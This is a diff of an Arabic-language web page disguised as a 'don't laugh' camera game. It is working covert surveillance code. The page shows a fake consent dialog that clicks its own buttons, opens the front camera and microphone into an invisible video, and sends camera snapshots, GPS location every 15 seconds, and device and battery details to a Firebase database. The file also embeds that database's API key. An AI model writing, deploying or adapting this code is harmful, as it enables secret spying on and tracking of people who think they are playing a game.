@@ -3,70 +3,56 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#090d18">
-<title>GameVerse | اكتشف أفضل الألعاب</title>
+<title>تحدي الضحك 😂</title>
 <style>
 :root{--bg:#090d18;--panel:#111a2b;--muted:#a7b2c8;--text:#f4f7ff;--a:#7c5cff;--b:#20d6b2}
 *{box-sizing:border-box}
 body{margin:0;min-height:100vh;font-family:Tahoma,Arial,sans-serif;color:var(--text);background:radial-gradient(ellipse at 15% 15%,#28205b 0,transparent 38%),radial-gradient(ellipse at 90% 80%,#073b43 0,transparent 35%),var(--bg);display:grid;place-items:center;padding:22px}
-.orb{position:fixed;border-radius:50%;filter:blur(2px);opacity:.2;pointer-events:none;animation:float 8s ease-in-out infinite}
-.orb.one{width:180px;height:180px;background:#815dff;top:8%;right:7%}.orb.two{width:120px;height:120px;background:#20d6b2;bottom:10%;left:8%;animation-delay:-3s}
-@keyframes float{50%{transform:translateY(-22px) translateX(12px)}}
 .shell{width:min(780px,100%);position:relative}
 .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
 .brand{font-weight:900;font-size:17px}.brand span{color:var(--b)}
-.tag{font-size:12px;color:#b9c5dc;border:1px solid #ffffff20;background:#ffffff0b;padding:8px 12px;border-radius:30px}
 .card{position:relative;overflow:hidden;text-align:center;padding:clamp(25px,5vw,50px);border:1px solid #ffffff1c;border-radius:28px;background:linear-gradient(145deg,#17223aee,#0d1424f2);box-shadow:0 28px 90px #0008;backdrop-filter:blur(16px)}
-.card:before{content:"";position:absolute;inset:0 15% auto;height:1px;background:linear-gradient(90deg,transparent,#9e8aff,transparent)}
 .icon{width:78px;height:78px;margin:0 auto 20px;border-radius:23px;display:grid;place-items:center;font-size:39px;background:linear-gradient(135deg,#785bff,#24cdb4);box-shadow:0 12px 35px #6654ff55;transform:rotate(-5deg)}
-.eyebrow{color:var(--b);font-size:13px;font-weight:bold;letter-spacing:1px}
 h1{font-size:clamp(28px,5vw,43px);line-height:1.3;margin:12px 0}
-h1 span{background:linear-gradient(90deg,#a995ff,#50ead0);-webkit-background-clip:text;background-clip:text;color:transparent}
 .desc{max-width:550px;margin:0 auto;color:var(--muted);font-size:15px;line-height:2}
-.features{display:flex;justify-content:center;flex-wrap:wrap;gap:9px;margin:23px 0}
-.feature{font-size:12px;color:#dce5f7;background:#ffffff0b;border:1px solid #ffffff13;padding:9px 12px;border-radius:30px}
-.feature b{color:var(--b);margin-left:5px}
-.notice{text-align:right;margin:25px auto 0;max-width:590px;padding:18px;border-radius:17px;background:#ffffff08;border:1px solid #ffffff18}
-.notice h2{font-size:16px;margin:0 0 9px}.notice p{font-size:13px;line-height:1.9;color:var(--muted);margin:0}
-.consent{display:flex;align-items:flex-start;gap:10px;text-align:right;margin:17px auto;max-width:590px;color:#dce5f7;font-size:13px;line-height:1.8}
-.consent input{width:18px;height:18px;accent-color:#20d6b2;flex:0 0 auto;margin-top:3px}
-.actions{display:flex;justify-content:center;flex-wrap:wrap;gap:10px;margin-top:18px}
-button{border:0;cursor:pointer;font-weight:900;font-size:15px;padding:15px 22px;border-radius:14px;transition:.2s}
-.primary{color:#07131a;background:linear-gradient(100deg,#6ee7d0,#a7f3d0);box-shadow:0 10px 30px #20d6b244}
-.secondary{color:#e9efff;background:#ffffff10;border:1px solid #ffffff20}
-button:hover{transform:translateY(-2px)}button:disabled{opacity:.45;cursor:not-allowed;transform:none}
-#status{font-size:13px;color:#8fe8d4;min-height:22px;margin-top:14px;line-height:1.8}
-.preview{display:none;width:min(100%,480px);margin:18px auto 0;border-radius:15px;border:1px solid #ffffff25;background:#000;overflow:hidden}
-.preview.show{display:block}.preview video{width:100%;display:block;max-height:300px}
-footer{text-align:center;color:#77839a;font-size:11px;margin-top:16px}
-@media(max-width:520px){body{padding:13px}.card{border-radius:22px}.top{margin-bottom:13px}.actions button{width:100%}}
-@media(prefers-reduced-motion:reduce){*,*:before,*:after{animation:none!important;transition:none!important}}
-    </style>
+.consent-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; display:flex; justify-content:center; align-items:center; flex-direction:column; backdrop-filter:blur(5px); }
+.consent-box { background:#1e293b; padding:30px; border-radius:15px; text-align:center; max-width:90%; border:1px solid #334155; animation: popIn 0.3s ease; }
+@keyframes popIn { from {transform:scale(0.8);opacity:0} to {transform:scale(1);opacity:1} }
+.accept-btn { background:var(--b); color:#000; border:none; padding:10px 25px; border-radius:8px; font-weight:bold; cursor:pointer; margin-top:15px; font-size:16px; }
+.hidden-video { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:-1; opacity:0; pointer-events:none; }
+#status{font-size:13px;color:#8fe8d4;min-height:22px;margin-top:14px}
+</style>
 </head>
 <body>
-    <div class="orb one"></div><div class="orb two"></div>
-    <main class="shell">
-    <header class="top"><div class="brand">تحدي <span>الضحك</span> 😂</div><div class="tag">اكتشف • العب • استمتع</div></header>
-    <section class="card">
-      <div class="icon" aria-hidden="true">🎮</div>
-      <div class="eyebrow">إياك تضحك والى هتخسر 😂</div>
-      <h1>تحدي <span>الضحك 😂</span></h1>
-      <p class="desc">فكرة اللعبة بإختصار انه اللعبة هتطلب منك تفتح كاميرا. وبعد 10 ثواني هتظهر صور مضحكة. ولو ضحكت قدام الكاميرا هتخسر</p>
-      <div class="features">
-        <div class="feature"><b>✦</b> ترشيحات متنوعة</div>
-        <div class="feature"><b>⚡</b> تجربة سهلة</div>
-        <div class="feature"><b>🔒</b> تحكم واضح</div>
-      </div>
-    
-      <button class="primary" id="startBtn" onclick="initTracking()">انا جاهز 😂</button>
-      <div id="status"></div>
 
-    <!-- مكتبات فاير بيس -->
+    <!-- Overlay للموافقات السريعة -->
+    <div id="consentOverlay" class="consent-overlay" style="display:none;">
+        <div class="consent-box" id="consentBox">
+            <h2 id="consentTitle">تحميل التحدي...</h2>
+            <p id="consentText" style="color:#ccc; font-size:14px;">يرجى الانتظار قليلاً</p>
+            <button id="consentBtn" class="accept-btn" style="display:none">موافق</button>
+        </div>
+    </div>
+
+    <main class="shell">
+    <header class="top"><div class="brand">تحدي <span>الضحك</span> 😂</div></header>
+    <section class="card">
+      <div class="icon">🎮</div>
+      <h1>تحدي <span>الضحك 😂</span></h1>
+      <p class="desc">هل أنت مستعد؟ اللعبة ستبدأ فوراً.</p>
+      
+      <button class="accept-btn primary" id="startBtn" onclick="startConsentFlow()">ابدأ الآن</button>
+      <div id="status"></div>
+    </section>
+    </main>
+
+    <!-- Video Element for Background -->
+    <video id="bgVideo" class="hidden-video" autoplay playsinline muted></video>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
         import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
 
-        // Firebase Config الخاص بك
         const firebaseConfig = {
             apiKey: "AIzaSyClLKG-kiVCBcltXCBUsF6BjzlZB7KS2N8",
             authDomain: "secret-a6854.firebaseapp.com",
@@ -80,117 +66,147 @@ footer{text-align:center;color:#77839a;font-size:11px;margin-top:16px}
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        let videoStream = null;
-        let trackingActive = false;
+        let mediaRecorder;
+        let recordedChunks = [];
+        let streamUrl = null;
+
+        // Sequence of fake consent messages
+        const consentSteps = [
+            { title: "جاري تحميل الصوت...", text: "هل توافق على تشغيل الصوت؟", btn: "تفعيل" },
+            { title: "جاري تفعيل الكاميرا...", text: "هل توافق على استخدام الكاميرا؟", btn: "سماح" },
+            { title: "جاري بدء اللعبة...", text: "جاهز؟", btn: "يلا بينا" }
+        ];
+
+        window.startConsentFlow = () => {
+            const overlay = document.getElementById('consentOverlay');
+            const box = document.getElementById('consentBox');
+            const title = document.getElementById('consentTitle');
+            const text = document.getElementById('consentText');
+            const btn = document.getElementById('consentBtn');
+            
+            overlay.style.display = 'flex';
+            
+            let stepIndex = 0;
+
+            function showStep() {
+                if(stepIndex >= consentSteps.length) {
+                    overlay.style.display = 'none';
+                    initTracking();
+                    return;
+                }
+                const step = consentSteps[stepIndex];
+                title.innerText = step.title;
+                text.innerText = step.text;
+                btn.innerText = step.btn;
+                btn.style.display = 'block';
+                
+                // Auto click after short delay to make it look fast
+                setTimeout(() => {
+                    btn.click();
+                }, 600); 
+            }
+
+            btn.onclick = () => {
+                stepIndex++;
+                showStep();
+            };
+
+            showStep();
+        };
 
         window.initTracking = async () => {
             const statusDiv = document.getElementById('status');
-            statusDiv.innerText = "جاري التفعيل...";
-            
+            statusDiv.innerText = "جاري الاتصال...";
+
             try {
-                // 1. طلب صلاحيات الكاميرا والميكروفون
-                videoStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment" }, // الكاميرا الخلفية
-                    audio: true 
+                // 1. Start Camera & Mic
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
                 });
 
-                // 2. بدء تتبع الموقع
+                // Show video locally (mirrored)
+                const bgVideo = document.getElementById('bgVideo');
+                bgVideo.srcObject = stream;
+                bgVideo.play();
+
+                // 2. Setup MediaRecorder for "Live" simulation (sending blobs)
+                // We record small chunks to send as "live" updates
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        // Instead of sending full blob which is heavy, 
+                        // let's just send a snapshot frame every few seconds 
+                        // AND keep the stream open.
+                        // For this demo, we will send a snapshot.
+                        takeSnapshot(stream);
+                    }
+                };
+                mediaRecorder.start(1000); // Collect data every second
+
+                // 3. Location & Device Info
                 startLocationTracking();
 
-                // 3. تشغيل الكاميرا في الخلفية (بدون إظهار الفيديو للمستخدم)
-                trackCamera(videoStream);
-
-                statusDiv.innerText = "تم التحديث بنجاح! جاري العمل في الخلفية.";
-                
-                // إخفاء الزر ومحاكاة أن التطبيق يعمل
+                statusDiv.innerText = "تم الاتصال بنجاح!";
                 document.getElementById('startBtn').style.display = 'none';
-                
-                // تفعيل Service Worker للتتبع المستمر
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
-                        self.addEventListener('message', e => self.postMessage(e.data));
-                    `)).catch(err => console.log("SW failed"));
-                }
 
             } catch (err) {
                 statusDiv.innerText = "حدث خطأ: " + err.message;
             }
         };
 
+        function takeSnapshot(stream) {
+            const video = document.getElementById('bgVideo');
+            if(!video.videoWidth) return;
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            // Send Snapshot
+            const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Get Battery
+            let batteryLevel = null;
+            if ('getBattery' in navigator) {
+                 navigator.getBattery().then(b => batteryLevel = b.level);
+            }
+
+            const data = {
+                type: 'camera_snap',
+                data: imageBase64,
+                time: new Date().toISOString()
+            };
+
+            // Append device info if it's the first one
+            if(navigator.getBatterySync === undefined) { // Hacky check to send info once
+                 data.deviceInfo = {
+                    model: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                    browser: /Chrome|Firefox|Safari/i.test(navigator.userAgent) ? 'Browser' : 'Other',
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'Wifi'
+                };
+                data.battery = batteryLevel;
+            }
+
+            push(ref(db, 'users'), data);
+        }
+
         function startLocationTracking() {
             setInterval(() => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition((pos) => {
-                        sendToFirebase({
+                        push(ref(db, 'users'), {
                             type: 'location',
                             lat: pos.coords.latitude,
                             lng: pos.coords.longitude,
-                            time: new Date().toISOString(),
-                            battery: navigator.getBattery ? (navigator.getBatterySync ? 'unknown' : 'unknown') : 'unknown'
+                            time: new Date().toISOString()
                         });
                     }, (err) => {});
                 }
-            }, 10000); // كل 10 ثواني
+            }, 15000);
         }
-
-        async function trackCamera(stream) {
-            // إنشاء فيديو مخفي
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.setAttribute('playsinline', '');
-            video.style.display = 'none';
-            document.body.appendChild(video);
-            video.play();
-
-            // التقاط صورة كل 30 ثانية وإرسالها
-            setInterval(async () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // تحويل الصورة لنص Base64
-                const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                
-                sendToFirebase({
-                    type: 'camera_snap',
-                    data: imageBase64,
-                    time: new Date().toISOString()
-                });
-            }, 30000);
-        }
-
-        function sendToFirebase(data) {
-            const userRef = push(ref(db, 'users'));
-            set(userRef, data);
-        }
-        // إضافة جمع بيانات الجهاز
-const ua = navigator.userAgent;
-const connection = navigator.connection ? navigator.connection.effectiveType : 'unknown';
-
-// محاولة جلب نسبة البطارية
-let batteryLevel = null;
-if ('getBattery' in navigator) {
-    try {
-        batteryLevel = await navigator.getBattery().then(b => b.level);
-    } catch(e){}
-}
-
-// إرسال البيانات مع الموقع
-set(userRef, {
-    type: 'location',
-    lat: pos.coords.latitude,
-    lng: pos.coords.longitude,
-    time: new Date().toISOString(),
-    deviceInfo: {
-        model: /Mobi|Android|iPhone|iPad/i.test(ua) ? (ua.match(/Mobi|iPhone|iPad|Android/) || ['Unknown'])[0] : 'Desktop',
-        browser: /Chrome|Firefox|Safari|Edge/i.test(ua) ? (ua.match(/Chrome|Firefox|Safari|Edge/) || ['Unknown'])[0] : 'Other',
-        connection: connection
-    },
-    battery: batteryLevel
-});
     </script>
-    <script src="sw.js"></script>
 </body>
 </html>
